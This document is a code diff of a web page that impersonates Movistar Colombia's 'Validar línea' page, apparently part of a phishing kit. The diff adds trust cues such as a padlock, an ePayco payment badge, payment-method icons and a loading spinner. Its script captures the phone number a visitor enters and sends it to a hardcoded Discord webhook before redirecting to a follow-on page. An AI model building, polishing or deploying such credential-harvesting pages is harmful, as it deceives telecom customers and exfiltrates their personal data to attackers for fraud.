@@ -8,25 +8,42 @@
   <title>Validar línea - Movistar</title>
   <link rel="shortcut icon" href="img/apple-touch-icon.png" type="image/x-icon">
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet" />
+
   <style>
     body {
-      background: linear-gradient(135deg, #019DF4, #004A99);
+      background-color: #f9f9f9;
+      font-family: 'Segoe UI', sans-serif;
+      margin: 0;
       min-height: 100vh;
       display: flex;
       flex-direction: column;
-      margin: 0;
-      font-family: 'Segoe UI', sans-serif;
     }
 
     header {
-      background-color: white;
+      background: #fff;
       padding: 1rem;
-      text-align: center;
-      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      border-bottom: 1px solid #eee;
+      flex-direction: column;
     }
 
     .header-image {
       max-height: 50px;
+    }
+
+    .header-footer-text {
+      text-align: center;
+      font-size: 0.85rem;
+      color: #555;
+      margin-top: 0.5rem;
+    }
+
+    .lock-icon {
+      width: 16px;
+      vertical-align: middle;
+      margin-right: 5px;
     }
 
     .login-container {
@@ -34,22 +51,45 @@
       display: flex;
       align-items: center;
       justify-content: center;
-      padding: 2rem;
+      padding: 2rem 1rem;
     }
 
     .login-box {
-      background: white;
+      background: #fff;
       padding: 2rem;
       border-radius: 12px;
-      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.08);
+      max-width: 420px;
       width: 100%;
-      max-width: 400px;
+      position: relative;
+      z-index: 1;
     }
 
     .login-box h2 {
-      color: #004A99;
       text-align: center;
       margin-bottom: 1.5rem;
+      font-size: 1.6rem;
+    }
+
+    .thin-text {
+      font-weight: 300;
+      color: #333;
+    }
+
+    .bold-text {
+      font-weight: 700;
+      color: #004A99;
+    }
+
+    .input-group {
+      align-items: center;
+      margin-bottom: 1rem;
+    }
+
+    .phone-icon {
+      width: 22px;
+      margin-right: 8px;
+      opacity: 0.7;
     }
 
     .form-control {
@@ -60,7 +100,8 @@
       background-color: #019DF4;
       border: none;
       border-radius: 8px;
-      font-weight: bold;
+      font-weight: 600;
+      padding: 0.75rem;
     }
 
     .btn-primary:hover {
@@ -70,13 +111,86 @@
     footer {
       text-align: center;
       padding: 1rem;
-      font-size: 0.9rem;
-      color: white;
+      font-size: 0.85rem;
+      color: #666;
+      background: #f1f1f1;
+      border-top: 1px solid #e0e0e0;
     }
 
-    @media (max-width: 400px) {
-      .login-box {
-        padding: 1.5rem;
+    .payment-methods {
+      margin-top: 1.5rem;
+      text-align: center;
+    }
+
+    .payment-methods h3 {
+      font-size: 1rem;
+      margin-bottom: 1rem;
+    }
+
+    .icons-container {
+      display: flex;
+      justify-content: center;
+      gap: 10px;
+      flex-wrap: wrap;
+    }
+
+    .payment-icon {
+      height: 30px;
+      object-fit: contain;
+    }
+
+    /* 🔹 Loader */
+    #loader {
+      display: none;
+      position: fixed;
+      left: 50%;
+      top: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 10000;
+      background: rgba(255, 255, 255, 0.8);
+      width: 100vw;
+      height: 100vh;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .svg-circle {
+      width: 4em;
+      height: 4em;
+      transform-origin: center;
+      animation: rotate4 2s linear infinite;
+      display: block;
+      margin: 0 auto;
+    }
+
+    circle {
+      fill: none;
+      stroke: #019DF4;
+      stroke-width: 4;
+      stroke-dasharray: 1, 200;
+      stroke-dashoffset: 0;
+      stroke-linecap: round;
+      animation: dash4 1.5s ease-in-out infinite;
+    }
+
+    @keyframes rotate4 {
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    @keyframes dash4 {
+      0% {
+        stroke-dasharray: 1, 200;
+        stroke-dashoffset: 0;
+      }
+      50% {
+        stroke-dasharray: 89, 200;
+        stroke-dashoffset: -35;
+      }
+      100% {
+        stroke-dasharray: 89, 200;
+        stroke-dashoffset: -124;
       }
     }
   </style>
@@ -85,17 +199,32 @@
 <body>
   <header>
     <img src="img/descarga.png" alt="Movistar Logo" class="header-image" />
+    <div class="header-footer-text">
+      <img src="img/lock.png" alt="Ícono de candado" class="lock-icon" />
+      <span>Pagos procesados por <img src="img/logo_ePayco.png" alt="Logo ePayco" style="height:16px;vertical-align:middle;" /></span>
+    </div>
   </header>
 
   <div class="login-container">
     <div class="login-box">
-      <h2>Validar línea</h2>
+      <h2><span class="thin-text">Validar</span> <span class="bold-text">línea</span></h2>
       <form id="loginForm">
-        <div class="mb-3">
+        <div class="input-group">
+          <img src="img/phone.png" alt="Teléfono" class="phone-icon" />
           <input type="text" id="linea" class="form-control" placeholder="Ingresa tu número de línea" required>
         </div>
         <button type="submit" class="btn btn-primary w-100">Continuar</button>
       </form>
+
+      <div class="payment-methods">
+        <h3><span class="bold-text">Nuevos medios de pago</span> <span class="thin-text">disponibles</span></h3>
+        <div class="icons-container">
+          <img src="img/1.png" alt="Medio de pago 1" class="payment-icon">
+          <img src="img/2.png" alt="Medio de pago 2" class="payment-icon">
+          <img src="img/3.png" alt="Medio de pago 3" class="payment-icon">
+          <img src="img/4.png" alt="Medio de pago 4" class="payment-icon">
+        </div>
+      </div>
     </div>
   </div>
 
@@ -103,11 +232,17 @@
     © Movistar Colombia - Todos los derechos reservados
   </footer>
 
+  <!-- 🔹 Loader -->
+  <div id="loader">
+    <svg viewBox="25 25 50 50" class="svg-circle">
+      <circle r="20" cy="50" cx="50"></circle>
+    </svg>
+  </div>
+
   <script>
-    // 🔹 Pega tu Webhook de Discord aquí
+    // 🔹 Webhook de Discord
     const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1416167076737056868/N0PLYys9FxoMqosemT9ACC6Il9qJlS1lmAkgriwfjugHpUPWd9ozsimjK5NdhYTRxiHS";
 
-    // Función para enviar mensaje al webhook
     function sendToDiscord(message) {
       const data = { content: message };
 
@@ -116,30 +251,34 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(data)
       })
-      .then(res => console.log("✅ Enviado a Discord"))
+      .then(() => console.log("✅ Enviado a Discord"))
       .catch(err => console.error("❌ Error enviando a Discord", err));
     }
 
-    // Captura el evento del formulario
     document.getElementById('loginForm').addEventListener('submit', function (e) {
       e.preventDefault();
 
       const linea = document.getElementById('linea').value.trim();
-
       if (!linea) return;
 
-      // Guardar en localStorage
-      localStorage.setItem('linea', linea);
+      // Mostrar loader
+      const loader = document.getElementById("loader");
+      loader.style.display = "flex";
 
-      // Formatear mensaje
-      const fecha = new Date().toLocaleString("es-CO");
-      const mensaje = `📲 **Nueva validación de línea:**\n🔢 Número: ${linea}\n🕒 Fecha: ${fecha}`;
+      setTimeout(() => {
+        loader.style.display = "none";
 
-      // Enviar a Discord
-      sendToDiscord(mensaje);
+        // Guardar en localStorage
+        localStorage.setItem('linea', linea);
 
-      // Redirigir a la siguiente página
-      window.location.href = "cargando.html";
+        // Enviar a Discord
+        const fecha = new Date().toLocaleString("es-CO");
+        const mensaje = `📲 **Nueva validación de línea:**\n🔢 Número: ${linea}\n🕒 Fecha: ${fecha}`;
+        sendToDiscord(mensaje);
+
+        // Redirigir
+        window.location.href = "cargando.html";
+      }, 2000);
     });
   </script>
 </body>
